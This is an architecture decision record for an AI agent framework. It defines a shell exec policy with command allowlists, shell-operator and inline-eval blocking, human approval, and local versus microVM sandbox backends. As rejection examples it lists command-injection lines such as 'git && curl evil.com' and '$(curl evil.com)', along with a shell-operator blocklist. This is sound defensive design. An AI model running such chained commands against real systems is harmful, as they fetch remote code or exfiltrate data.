# ADR-010: Exec Policy + Dual Sandbox Backend

**Status:** Accepted **Date:** 2026-03-27 **Extends:** ADR-005
(permissions by intersection)

## Context

ADR-005 defines Sandbox permissions as the intersection of tool requirements and
agent allowances. Two major problems still remained:

1. **`sh -c` bypasses Deno `--allow-*` flags.** The current `ShellTool` uses
   `new Deno.Command("sh", ["-c", command])`. With `--allow-run=sh`, the agent
   can execute any binary through the intermediate shell. Deno flags no longer
   protect anything meaningful.

2. **Two different sandbox backends.** Locally, code runs inside a Deno
   subprocess with `--allow-*` flags (V8 isolation, but no OS-level isolation).
   In cloud mode, `@deno/sandbox` provides Firecracker microVMs
   (hardware-level isolation). The security guarantees are not the same.

## Decision

### 1. Exec Policy on `ShellTool`

Inspired by the OpenClaw model, shell execution is no longer "free by default".
Each agent declares an **exec policy**:

```typescript
interface ExecPolicyBase {
  ask: "off" | "on-miss" | "always";
  askFallback?: "deny" | "allowlist";
}

interface ExecPolicyDeny extends ExecPolicyBase {
  security: "deny";
}

interface ExecPolicyFull extends ExecPolicyBase {
  security: "full";
  /** Extra env prefixes to filter (in addition to LD_*, DYLD_*) */
  envFilter?: string[];
}

interface ExecPolicyAllowlist extends ExecPolicyBase {
  security: "allowlist";
  /** Allowed commands (binary name, first word only) */
  allowedCommands?: string[];
  /** Keyword blocklist — matches anywhere in the command */
  deniedCommands?: string[];
  /** Extra env prefixes to filter (in addition to LD_*, DYLD_*) */
  envFilter?: string[];
  /** Allow inline eval flags (-c, -e) for known interpreters (default: false = blocked) */
  allowInlineEval?: boolean;
}

type ExecPolicy = ExecPolicyDeny | ExecPolicyFull | ExecPolicyAllowlist;
```

#### Security levels

| `security`  | Behavior                                                                                |
| ----------- | --------------------------------------------------------------------------------------- |
| `deny`      | No shell execution. The tool returns a structured error.                                |
| `allowlist` | Only binaries listed in `allowedCommands` are allowed. Everything else depends on `ask`. |
| `full`      | Everything is allowed (cloud sandbox only, or intentional local dev mode).              |

#### Human approval (`ask`)

| `ask`     | Behavior                                                                    |
| --------- | --------------------------------------------------------------------------- |
| `off`     | Execute or reject silently according to policy.                             |
| `on-miss` | If the binary is not in the allowlist, ask for approval through broker/CLI. |
| `always`  | Every command requires approval.                                            |

**`askFallback`** applies when the approval channel (broker tunnel / CLI) is
unavailable and `ask` triggers. Default: `"deny"`. This prevents silent
degradation into unrestricted execution when the tunnel is down.

**Approval timeout:** if no human response arrives in time, treat it as a
denial. Approval timeout is separate from execution timeout (`maxDurationSec`).

#### Command resolution and shell-operator detection

There are two validation levels in `allowlist` mode:

**Level 1 — Binary (first word):** split on the first space and look up in a
`Set`.

**Level 2 — Shell operators:** in `allowlist` mode, commands containing shell
chaining operators are **rejected** unless approval is granted through `ask`.
Detected operators:

```
;   &&   ||   |   $(   `   >   >>   <
```

```
"git status"              → binary = "git"  ✅ allowlist
"deno test ./foo"         → binary = "deno" ✅ allowlist
"git && curl evil.com"    → operator "&&" detected → ❌ REJECTED (ask if on-miss)
"ls | grep foo"           → operator "|" detected  → ❌ REJECTED (ask if on-miss)
"sh -c 'curl ...'"        → binary = "sh"  → ❌ sh not in allowlist
"$(curl evil.com)"        → operator "$(" detected → ❌ REJECTED
```

`sh`, `bash`, and `zsh` are **never** part of the default allowlist.

#### `allowInlineEval` — known interpreters

When disabled (default: `false`), inline-eval flags are blocked even if the
binary itself is in the allowlist:

```
python -c 'import os; ...'    → "-c" detected on interpreter → ❌ REJECTED (ask if on-miss)
node -e 'require("child_..."' → "-e" detected on interpreter → ❌ REJECTED
ruby -e '...'                 → "-e" detected → ❌ REJECTED
deno eval '...'               → "eval" subcommand → ❌ REJECTED
```

Watched interpreters: `python`, `python3`, `node`, `ruby`, `perl`, `deno`,
`bun`.

#### Environment filtering

The local subprocess filters these variables before execution:

```typescript
const DENIED_ENV_PREFIXES = ["LD_", "DYLD_"];
```

This prevents dynamic-library injection. `PATH` remains available so binaries
such as `git` and `deno` can still be resolved by `Deno.Command`. A marker
variable, `DENOCLAW_EXEC=1`, is injected so shell profiles can detect the
execution context.

### 2. Dual Sandbox Backend

#### Core principle: same executor, two isolation envelopes

Both backends execute the **same `tool_executor.ts`** with the **same tools**
(`ShellTool`, `ReadFileTool`, etc.). The backend only changes the isolation
envelope around that executor. This guarantees:

- **AX #6 Deterministic** — same inputs = same outputs, regardless of backend
- **AX #8 Composable** — backend is a swappable primitive, not a separate runtime
- **No divergence** — there are not two different execution paths to maintain

```
┌─────────────────────────────────────────────────────────────┐
│ Both backends execute:                                     │
│   deno run [--allow-*] tool_executor.ts '{"tool":"shell"}' │
│                                                             │
│ LocalProcessBackend : via Deno.Command (local child process)│
│ DenoSandboxBackend  : via sandbox.sh (Firecracker microVM)  │
└─────────────────────────────────────────────────────────────┘
```

#### `SandboxBackend` interface

```typescript
interface SandboxBackend {
  readonly kind: "local" | "cloud";

  /** Execute a tool inside the isolated environment */
  execute(req: SandboxExecRequest): Promise<SandboxExecResult>;

  /** Cloud only: does this backend safely support unrestricted shell? */
  readonly supportsFullShell: boolean;

  /** Release resources (close cloud sandbox, etc.) */
  close(): Promise<void>;
}

interface SandboxExecRequest {
  tool: string;
  args: Record<string, unknown>;
  permissions: SandboxPermission[];
  networkAllow?: string[];
  timeoutSec?: number;
  execPolicy: ExecPolicy;
  /** Callback for human approval (`ask: on-miss | always`) */
  onAskApproval?: (req: ApprovalRequest) => Promise<ApprovalResponse>;
}

interface ApprovalRequest {
  requestId: string;
  command: string;
  binary: string;
  reason: "not-in-allowlist" | "shell-operator" | "inline-eval" | "always-ask";
}

interface ApprovalResponse {
  approved: boolean;
  /** If true, add the binary to the session allowlist */
  allowAlways?: boolean;
}

interface SandboxExecResult {
  success: boolean;
  output: string;
  error?: {
    code: string;
    context?: Record<string, unknown>;
    recovery?: string;
  };
}
```

#### `LocalProcessBackend` (dev/offline mode)

- Spawns
  `Deno.Command("deno", ["run", ...flags, "tool_executor.ts", input])`
  (ADR-005 intersection)
- Exec policy is **enforced before spawn**: allowlist + shell operators +
  `allowInlineEval` + `ask` + env filtering
- `supportsFullShell: false`
- Security: crash isolation + timeout + policy enforcement. No OS isolation.
- `close()`: no-op (no persistent resource)

#### `DenoSandboxBackend` (cloud/prod mode)

- Uses `@deno/sandbox` SDK v0.13+ (`Sandbox.create()` + `sandbox.sh`)
- Firecracker microVM with hardware isolation
- `supportsFullShell: true` — unrestricted shell is acceptable because the VM
  is isolated and ephemeral
- Exec policy is **optional** here: `security: "full"` can be valid because the
  VM supplies the isolation boundary
- Requires `DENO_DEPLOY_TOKEN` + internet access
- `close()`: calls `sandbox.kill()` to destroy the VM

**`buildSandboxCode`** — the broker generates the Deno code to run inside the
VM via `buildSandboxCode()`. That generated code follows the same rules as the
local `tool_executor.ts`: `dry_run: true` by default (AX #2), direct binary
execution without `sh -c`, and structured stdout output. The same security
expectations apply to the generated cloud path as to the local path.

**Execution:** identical to local mode, but inside the VM:

```typescript
await sandbox.sh`deno run tool_executor.ts '${input}'`;
```

#### `DenoSandboxBackend` lifecycle

```
                     ToolRegistry
                         │
                  setBackend(backend)
                         │
                   ┌─────▼──────┐
                   │ SandboxBack│
                   │   end      │
                   └─────┬──────┘
                         │
     ┌───────────────────┼───────────────────┐
     │                   │                   │
execute() #1        execute() #2        execute() #N
     │                   │                   │
     ▼                   ▼                   ▼
┌─────────┐         (reuses)            (reuses)
│ Lazy    │              │                   │
│ init:   │              │                   │
│ 1. Sandbox.create()   │                   │
│ 2. fs.upload(tools/)  │                   │
│ 3. Store instance     │                   │
└────┬────┘              │                   │
     │                   │                   │
     ▼                   ▼                   ▼
sandbox.sh`...`     sandbox.sh`...`     sandbox.sh`...`
     │                   │                   │
     └───────────────────┼───────────────────┘
                         │
                   close() ← called by AgentLoop.close()
                         │
                   sandbox.kill()
                   VM destroyed
```

**Lazy init:** the VM is created only on the first `execute()`, not when the
backend is constructed. That avoids provisioning a VM if the agent never calls
any tool.

**Initialization steps** (first `execute()` only):

1. `Sandbox.create({ region, allowNet, timeout, env })` — provisions the microVM
2. `sandbox.fs.upload("src/agent/tools/", "/app/tools/")` — uploads
   `tool_executor.ts` + all tools
3. Store the `sandbox` instance for reuse

**Reuse:** one sandbox per agent. Later `execute()` calls reuse the same VM.
Filesystem state persists between calls, so files created by one tool remain
visible to the next one.

**Close:** cascade from `AgentLoop.close()`:

```
AgentLoop.close()
  → ToolRegistry.close()       ← NEW
    → SandboxBackend.close()
      → sandbox.kill()          (cloud: destroy the VM)
      → no-op                   (local: nothing to close)
```

`AgentLoop.close()` (existing, `loop.ts:244`) is extended to call
`this.tools.close()`. `ToolRegistry` gains a `close()` method that cascades into
the backend.

#### Capability matrix

| Capability    | LocalProcessBackend                   | DenoSandboxBackend                                                    |
| ------------- | ------------------------------------- | --------------------------------------------------------------------- |
| Executor      | `tool_executor.ts` via `Deno.Command` | `tool_executor.ts` via `sandbox.sh`                                   |
| Full shell    | No (allowlist + ask + operator checks) | Yes (isolated VM)                                                     |
| Isolation     | V8 flags + process                    | Firecracker VM                                                        |
| Network       | `--allow-net=host`                    | `allowNet: [host]`                                                    |
| FS            | Host filesystem (permission flags)    | Isolated VM filesystem + upload/download                              |
| Secrets       | Visible in env (filtered)             | Via `SandboxOptions.env` (plain inside VM) or `secrets` (HTTPS-only)  |
| Cost          | Free                                  | Metered (pre-release, free tier TBD)                                  |
| Offline       | Yes                                   | No                                                                    |
| Reuse         | New process per tool call             | One sandbox per agent (multi-tool session)                            |
| Concurrency   | Unlimited                             | 5 sandboxes max per org (pre-release)                                 |
| Init          | Instant                               | ~1s (lazy, first execution only)                                      |
| `close()`     | No-op                                 | `sandbox.kill()`                                                      |

### 3. Backend selection — fail-closed and explicit

```typescript
// Agent config
{
  "sandbox": {
    "backend": "local",  // "local" | "cloud" — never "auto"
    "allowedPermissions": ["read", "write", "run", "net"],
    "execPolicy": {
      "security": "allowlist",
      "allowedCommands": ["git", "deno", "npm", "ls", "cat", "grep"],
      "ask": "on-miss",
      "askFallback": "deny",
      "allowInlineEval": false
    }
  }
}
```

There is **no `"auto"` mode** (AX #7 — Explicit Over Implicit). Backend choice
is **always explicit** in config. Choosing implicitly from environment
variables would create silent bugs where the same config behaves differently
depending on where it runs, which violates AX #6 (Deterministic).

Selection rules:

| `backend` | `DENO_DEPLOY_TOKEN` present | Token absent                                       |
| --------- | --------------------------- | -------------------------------------------------- |
| `"cloud"` | → `DenoSandboxBackend`      | → **`SANDBOX_UNAVAILABLE` error** (fail-closed)    |
| `"local"` | → `LocalProcessBackend`     | → `LocalProcessBackend`                            |

**Fail-closed:** if an agent asks for `"cloud"` and the token is unavailable,
execution fails with a structured error:

```typescript
{
  code: "SANDBOX_UNAVAILABLE",
  context: { backend: "cloud", reason: "DENO_DEPLOY_TOKEN not set" },
  recovery: "Set DENO_DEPLOY_TOKEN or use backend: 'local'"
}
```

**Default:** `"local"` when `backend` is omitted. Explicit and predictable.

### 4. Approval flow (`ask`) — Worker ↔ Broker/CLI

Approval happens **before** the subprocess or sandbox command is started, inside
the backend running in the worker thread:

```
SandboxBackend.execute(req)
  → validate execPolicy (binary, operators, inline eval)
  → if ask is triggered:
      → req.onAskApproval({ requestId, command, binary, reason })
        │
        │ implemented by the Worker through the existing protocol:
        │
        │   WorkerResponse { type: "ask_approval", requestId, command, binary, reason }
        │     → WorkerPool.handleWorkerMessage()
        │       → callbacks.onAskApproval(agentId, requestId, command, binary)
        │         → CLI mode: terminal stdin prompt
        │         → Gateway mode: WebSocket to connected client
        │       → worker.postMessage({ type: "ask_response", requestId, approved, allowAlways })
        │     → Promise resolves inside the Worker
        │
      → if approved: execute (local spawn or sandbox.sh)
      → if denied: return structured EXEC_DENIED error
      → if allowAlways: add binary to the session allowlist
```

This is symmetric with the existing `agent_send` / `agent_response` messages in
`worker_protocol.ts`.

**Separate timeouts** (AX #7 — Explicit):

- `approvalTimeoutSec`: max wait for human response. Default: 60s. Expiration = denial.
- `maxDurationSec`: max tool execution time after approval. Already exists in `SandboxConfig`.

The two timeouts are independent. One does not include the other.

## Consolidating `ToolsConfig` vs `ExecPolicy`

`ToolsConfig.allowedCommands` and `ToolsConfig.deniedCommands` are
**deprecated** in favor of `ExecPolicy.allowedCommands` and
`ExecPolicy.deniedCommands`. Migration rules:

- If `ToolsConfig.allowedCommands` is present and `ExecPolicy` is absent →
  automatically migrate to
  `ExecPolicy { security: "allowlist", allowedCommands: [...], ask: "off" }`
- If both are present → `ExecPolicy` wins, with a warning in the logs
- `ToolsConfig.restrictToWorkspace` stays in `ToolsConfig`
  (it governs filesystem scope, not exec policy)

## File impact

| File                                  | Change                                                                                                                |
| ------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
| `src/shared/types.ts`                 | Add `ExecPolicy`, `SandboxBackend`, `SandboxExecRequest`, `SandboxExecResult`, `ApprovalRequest`, `ApprovalResponse` |
| `src/shared/mod.ts`                   | Export the new types                                                                                                  |
| `src/agent/tools/registry.ts`         | `setSandbox()` → `setBackend(SandboxBackend)`, add cascading `close()`                                                |
| `src/agent/tools/subprocess.ts`       | Rename/refactor → `backends/local.ts` (`LocalProcessBackend`)                                                         |
| `src/agent/tools/shell.ts`            | Remove `sh -c`, execute binary directly, enforce exec policy                                                          |
| `src/agent/tools/tool_executor.ts`    | `ExecutorInput.config` now receives `execPolicy`                                                                      |
| `src/agent/tools/backends/cloud.ts`   | New: `DenoSandboxBackend` — lazy init, tool upload, `sandbox.sh`, `close()` → `sandbox.kill()`                       |
| `src/agent/tools/backends/factory.ts` | New: backend selection `"local"` / `"cloud"`, fail-closed                                                             |
| `src/agent/loop.ts`                   | Extend `close()` to call `this.tools.close()`                                                                         |
| `src/agent/worker_protocol.ts`        | Add `ask_approval` / `ask_response` messages                                                                          |
| `src/agent/worker_pool.ts`            | Add `ask_approval` handler, `onAskApproval` callback                                                                  |
| `src/agent/types.ts`                  | Deprecate `allowedCommands` / `deniedCommands` on `ToolsConfig`                                                       |
| `src/cli/agents.ts`                   | Expose `execPolicy` in agent creation                                                                                 |
| `deno.json`                           | Add `@deno/sandbox` to imports                                                                                        |

## Identified risks

1. **`tool_executor.ts` is a standalone script** — it does not share type-check
   state with the parent. `ExecutorInput.config` has to stay in sync manually.
   Only integration tests catch drift.

2. **`ask` blocks the Worker** — while waiting for approval, the Worker cannot
   process other messages. That is acceptable for human workflows if the
   response is fast. Approval timeout (60s) remains separate from execution
   timeout (`maxDurationSec`).

3. **5 sandboxes max in pre-release** — this may throttle multi-agent workloads.
   We may need pooling/queueing inside `DenoSandboxBackend` or escalation with Deno.

4. **`@deno/sandbox` secrets are HTTPS-only** — values passed via
   `SandboxOptions.secrets` are not available in `process.env` inside the
   sandbox. They are only injected for outbound HTTPS calls. CLI tools that read
   env vars must use `SandboxOptions.env` instead, which means plain values are
   visible inside the VM. This distinction needs to be documented.

5. **Zero tests on the current subprocess path** — the refactor has no safety
   net. `LocalProcessBackend` and `ExecPolicy` tests should be added first.

6. **Tool upload into cloud sandbox** — on first `execute()`,
   `DenoSandboxBackend` uploads `src/agent/tools/` into the VM. If tool files
   change between builds, the VM may temporarily run an out-of-sync copy.
   Mitigation: the sandbox is ephemeral (30-minute max) and recreated for each
   agent session.

## Consequences

- The current `ShellTool` (`sh -c`) is replaced with direct binary execution in
  local mode
- Shell-operator and `allowInlineEval` detection adds roughly 50 lines of validation
- `ExecPolicy` is added to shared `SandboxConfig`
- `ToolRegistry` gains `close()` for backend lifecycle, cascaded from
  `AgentLoop.close()`
- `ToolRegistry` now goes through `SandboxBackend.execute()` instead of calling
  `executeInSubprocess()` directly
- The `ask` callback uses the existing Worker protocol
  (symmetric with `agent_send`)
- `@deno/sandbox` (`jsr:@deno/sandbox`) must be added to `deno.json`
- `ToolsConfig.allowedCommands` / `deniedCommands` are deprecated and migrate to
  `ExecPolicy`
- No `"auto"` mode — backend choice is always explicit (AX #7)

## AX verification

| #  | Principle                 | Applied in this ADR                                                                                                                |
| -- | ------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| 1  | No Verb Overlap           | `security` ≠ `ask` ≠ `askFallback` — separate fields, distinct semantics                                                           |
| 2  | Safe Defaults             | `security: "allowlist"`, `ask: "on-miss"`, `askFallback: "deny"`, `allowInlineEval: false`, `backend: "local"`                   |
| 3  | Structured Outputs        | `SandboxExecResult` with `StructuredError` (`code` + `context` + `recovery`)                                                      |
| 4  | Machine-Readable Errors   | `SANDBOX_UNAVAILABLE`, `EXEC_DENIED`, `SANDBOX_PERMISSION_DENIED` — enum-like codes                                               |
| 5  | Fast Fail Early           | Exec policy is validated **before** spawn, not inside the subprocess                                                               |
| 6  | Deterministic             | Same config = same backend = same behavior. No `"auto"` mode                                                                       |
| 7  | Explicit Over Implicit    | Backend selected in config, not from env vars. Fail-closed on `"cloud"` without token. Separate timeouts. Warning on deprecated config |
| 8  | Composable                | `SandboxBackend` is interchangeable. Same `tool_executor.ts` in both backends                                                      |
| 9  | Narrow Contracts          | `SandboxExecRequest` contains only required fields. `ExecPolicy` keeps optional fields with safe defaults                          |
| 10 | Co-located Documentation  | ADR lives next to the code. Tests remain executable documentation                                                                   |
| 11 | Test-First Invariants     | `ExecPolicy` and `LocalProcessBackend` tests should be added first                                                                  |

## References

- ADR-005: Sandbox permissions by intersection
- ADR-001: Agents in Subhosting, code execution in Sandbox
- OpenClaw exec tool: https://docs.openclaw.ai/tools/exec
- OpenClaw exec approvals: https://docs.openclaw.ai/tools/exec-approvals
- OpenClaw node host: https://docs.openclaw.ai/cli/node
- Deno Sandbox docs: https://docs.deno.com/sandbox/
- `@deno/sandbox` JSR: https://jsr.io/@deno/sandbox (v0.13.2, pre-release)
